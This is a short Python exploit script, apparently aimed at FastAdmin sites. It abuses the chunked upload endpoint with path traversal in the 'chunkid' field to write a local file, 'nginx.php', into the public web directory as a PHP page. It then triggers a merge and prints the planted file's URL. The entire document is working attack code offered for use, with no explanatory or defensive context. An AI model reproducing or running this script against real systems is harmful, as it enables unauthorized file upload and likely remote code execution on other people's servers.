import sys
import requests
from time import time
import json

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'
                  ' Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
}


def upload_chunk(url):
    upload_url = url.rstrip('/') + '/index/ajax/upload'
    file = {
        'file': ('%d.php' % time(), open('nginx.php', 'rb'), 'application/octet-stream')
    }
    chunk_id = time()
    data_ = {
        'chunkid': '../../public/%d.php' % chunk_id,
        'chunkindex': 0,
        'chunkcount': 1
    }
    resp = requests.post(
        upload_url,
        headers=headers,
        files=file,
        data=data_
    )
    result = json.loads(resp.text)
    if result['code'] == 1 and result['msg'] == '' and result['data'] is None:
        merge_file(upload_url, chunk_id)
        print('\nWebhelp: %s/%d.php' % (url.rstrip('/'), chunk_id))
    elif result['msg'] != '':
        print("Not Vulnerability, {result['msg']}.")
    else:
        print('Not Vulnerability.')


def merge_file(url, chunk_id):
    data = {
        'action': 'merge',
        'chunkid': '../../public/%d.php' % chunk_id,
        'chunkindex': 0,
        'chunkcount': 1,
        'filename': '%d.php-0.part' % chunk_id
    }
    resp = requests.post(
        url,
        headers=headers,
        data=data
    )


if __name__ == '__main__':
    if len(sys.argv) == 2:
        try:
            headers['Cookie'] = input('Cookie > ')
            upload_chunk(sys.argv[1])
        except Exception as e:
            print(e)
    else:
        print('Usage: python3 FastAdmin.py url')

